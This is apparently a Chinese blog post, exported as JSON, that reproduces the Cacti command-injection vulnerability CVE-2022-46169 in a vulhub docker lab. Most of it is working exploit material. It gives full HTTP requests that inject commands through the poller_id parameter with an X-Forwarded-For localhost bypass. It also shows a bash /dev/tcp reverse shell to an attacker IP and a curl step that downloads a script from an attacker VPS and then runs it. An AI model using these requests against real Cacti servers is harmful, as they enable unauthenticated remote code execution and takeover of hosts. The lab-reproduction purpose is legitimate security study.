{"title":"Cacti前台命令注入漏洞(CVE-2022-46169)复现","uid":"d01e9b9478aaf264048aea2ee163e73a","slug":"Cacti前台命令注入漏洞-CVE-2022-46169-复现","date":"2022-12-15T08:49:17.000Z","updated":"2023-04-21T10:55:00.880Z","comments":true,"path":"api/articles/Cacti前台命令注入漏洞-CVE-2022-46169-复现.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<p>直接看文章复现：<a href=\"https://github.com/vulhub/vulhub/blob/master/cacti/CVE-2022-46169/README.zh-cn.md\">https://github.com/vulhub/vulhub/blob/master/cacti/CVE-2022-46169/README.zh-cn.md</a></p>\n<h2 id=\"payload没有回显：\"><a href=\"#payload没有回显：\" class=\"headerlink\" title=\"payload没有回显：\"></a>payload没有回显：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;touch+&#x2F;tmp&#x2F;aaa&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1</code></pre>\n\n<h2 id=\"反弹shell：\"><a href=\"#反弹shell：\" class=\"headerlink\" title=\"反弹shell：\"></a>反弹shell：</h2><p>测试一下反弹shell：bash -i &gt;&amp; /dev/tcp/IP/6666 0&gt;&amp;1</p>\n<p>payload使用了+号连接命令，直接反弹shell，web页面正常返回，但是接收不到shell。本地执行带+的命令肯定出错，所以+号是分割符。</p>\n<p>可以将反弹shell命令写入1.txt</p>\n<p>之后在vps上开启python的http服务，通过curl下载1.txt内容并且输出到2.sh</p>\n<p>之后通过bash运行，直接./2.sh是不行的</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">python -m http.server 80\n\ncurl+http:&#x2F;&#x2F;IP&#x2F;1.txt+&gt;2.sh\n\nchmod+755+2.sh  #开始没有测试\n\nbash+2.sh   \n或者 .&#x2F;2.sh source+2.sh  . 2.sh  这三种都不行</code></pre>\n\n<p>这个docker环境里面不需要赋权限就可以运行，可能是因为整个目录下都给了执行权限吧。</p>\n<p>后面又在服务器上测试了一下，发现了问题</p>\n<p>我是通过bash执行的这个sh文件，直接就有了bash的权限。</p>\n<p>直接执行 ./2.sh ，是不行的因为没有执行权限</p>\n<p>docker里执行./2.sh同样是权限拒绝，所以现在可以测试chmod命令是否能执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;chmod+755+2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1</code></pre>\n\n<p>发包之后，发现权限被修改了</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2023/png/25696976/1682074477180-ffc585f3-4ebc-438c-bafe-4fefd376d95e.png\" alt=\"83.png\"></p>\n<p>在执行 ./2.sh，发现还是不能反弹shell。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;.&#x2F;2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1</code></pre>\n\n<p>又找了一下，发现 . 2.sh 也可以执行脚本，再发包</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;.+2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1</code></pre>\n\n<p>又不行，看第四种，source 2.sh</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;source+2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1</code></pre>\n\n<p>还是不行？？？</p>\n<p>再换成bash，直接就弹shell了？？？？？？</p>\n<p>本地执行都是没有问题的。这又是为什么呢?</p>\n<p>最后在测试一个sh 2.sh，发现还是不行。docker里测试发现报错，sh指向了dash而不是bash</p>\n<p>解决方法：<a href=\"https://blog.csdn.net/qq_44664843/article/details/120509888\">https://blog.csdn.net/qq_44664843/article/details/120509888</a></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mv &#x2F;bin&#x2F;sh &#x2F;bin&#x2F;sh.orig\nln -s &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh</code></pre>\n\n<p>root不用加sudo</p>\n<p>再测试一下sh执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;sh+2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n</code></pre>\n\n<p>弹shell成功了</p>\n<p>几种执行sh文件的方式：</p>\n<p><a href=\"https://blog.csdn.net/weixin_45668674/article/details/107394335\">https://blog.csdn.net/weixin_45668674/article/details/107394335</a></p>\n<p><a href=\"https://www.cnblogs.com/pcat/p/5467188.html\">https://www.cnblogs.com/pcat/p/5467188.html</a></p>\n<h2 id=\"关闭环境：\"><a href=\"#关闭环境：\" class=\"headerlink\" title=\"关闭环境：\"></a>关闭环境：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">docker-compose down -v #关闭镜像 \ndocker images   #列出所有下载镜像 \ndocker rmi --force ID    #删除ID镜像</code></pre>\n\n<p>至于p牛的回显问题，都弹shell了，回显干什么。</p>\n","text":" 直接看文章复现：https://github.com/vulhub/vulhub/blob/master/cacti/CVE-2022-46169/README.zh-cn.md payload没有回显：GET &#x2F;remote_agent.php?action&#x3...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"RCE","slug":"RCE","count":2,"path":"api/categories/RCE.json"}],"tags":[{"name":"PHP","slug":"PHP","count":7,"path":"api/tags/PHP.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#payload%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%9A\"><span class=\"toc-text\">payload没有回显：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BC%B9shell%EF%BC%9A\"><span class=\"toc-text\">反弹shell：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B3%E9%97%AD%E7%8E%AF%E5%A2%83%EF%BC%9A\"><span class=\"toc-text\">关闭环境：</span></a></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java代码审计练习项目JXC","uid":"99274788880f67f15a0d8a86bea61410","slug":"Java代码审计练习项目JXC","date":"2022-12-18T07:10:52.000Z","updated":"2023-04-21T10:52:37.772Z","comments":true,"path":"api/articles/Java代码审计练习项目JXC.json","keywords":null,"cover":[],"text":" 环境搭建：视频地址：https://www.bilibili.com/video/BV1NG4y187dX/?spm_id_from=333.788&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e 修改配置文件的数据库账号密码，以及...","link":"","photos":[],"count_time":{"symbolsCount":"3.7k","symbolsTime":"3 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"Java","slug":"Java","count":22,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java代码审计练习项目Mini-Tmall","uid":"b150dfa8a93554c7d2d6ced6f280771f","slug":"Java代码审计练习项目Mini-Tmall","date":"2022-12-10T07:38:39.000Z","updated":"2023-04-21T10:58:46.075Z","comments":true,"path":"api/articles/Java代码审计练习项目Mini-Tmall.json","keywords":null,"cover":[],"text":" 环境搭建：项目地址：https://gitee.com/project_team/Tmall_demo#%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E 大佬视频教程链接：https://www.bilibili.co...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"Java","slug":"Java","count":22,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}